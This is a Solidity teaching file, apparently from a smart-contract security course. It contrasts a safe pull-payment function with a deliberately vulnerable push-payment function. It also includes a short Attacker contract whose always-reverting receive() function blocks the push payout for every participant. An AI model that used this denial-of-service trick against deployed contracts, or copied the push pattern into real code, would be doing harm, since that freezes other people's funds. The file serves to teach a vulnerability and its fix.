// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

uint256 constant BATCH = 4;

/**
    @notice This contract allows a total of `BATCH` participants to deposit funds and then expose two 
        functions to retrieve the funds. One of them follow the Push pattern, while the other
        is safe and uses the Pull pattern.
    @custom:deployed-at INSERT ETHERSCAN URL
    @custom:exercise This contract is part of the examples at https://github.com/jcr-security/solidity-security-teaching-resources
    
 */
contract PullOverPush is Ownable {

    struct Participant {
        address participant;
        bool claimed;
    }

    Participant[] winners;  
    uint256 public pot;

    // Checks if there is room for a new participant and that it is not already in the list
    modifier newParticipant() {
        require (winners.length < BATCH, "The list is full!");
        for (uint256 i; i < winners.length; i++) {
            if (winners[i].participant == msg.sender) revert("Already a participant!");
        }
        _;
    }

    // Checks if the participation is closed
    modifier participationClosed() {
        require (winners.length == BATCH, "Waiting for additional participants...");
        _;
    }

    receive() external payable onlyOwner {
        require(msg.value > 0, "Zero transfer not allowed");
        require(msg.value % BATCH == 0, "You should add at least 1 ETH per participant");

        pot += msg.value;
    }

    function participate() external newParticipant {
        winners.push(
            Participant(msg.sender, false)
        );
    }

    // Recommended approach: each participant "pulls" their funds
    function retrieveOnePull() external participationClosed {
        for (uint256 i; i < winners.length; i++) { // An arbitrarily long list could be a problem, but this one is capped to BATCH
            if (winners[i].participant == msg.sender) {
                if (winners[i].claimed) revert("Already claimed!");
                winners[i].claimed = true;
    
                (bool success, ) = payable(msg.sender).call{value: pot / BATCH}("");
                require(success, "Transfer failed.");
            }
        }                  
    }

    // Vulnerable approach: someone forces the "push" of all the funds
    function retrieveAllPush() external participationClosed {
        for (uint256 i; i < winners.length; i++) {
            if (!winners[i].claimed) {
                winners[i].claimed = true;

                (bool success, ) = payable(winners[i].participant).call{value: pot / BATCH}("");
                require(success, "Transfer failed.");   
            }
        }
    }
}


/************************** Attacker contract ***************************/

/**
    @notice This contract is used to exploit the Push pattern of the above contract.
        Calling joinContest() is enough to lock down the push pattern
 */
contract Attacker {
    PullOverPush target;

    constructor(address payable _target) {
        target = PullOverPush(_target);
    }

    receive() external payable {
        revert("Next time you should use Pull over Push!");
    }

    function joinContest() external {
        target.participate();
    }

}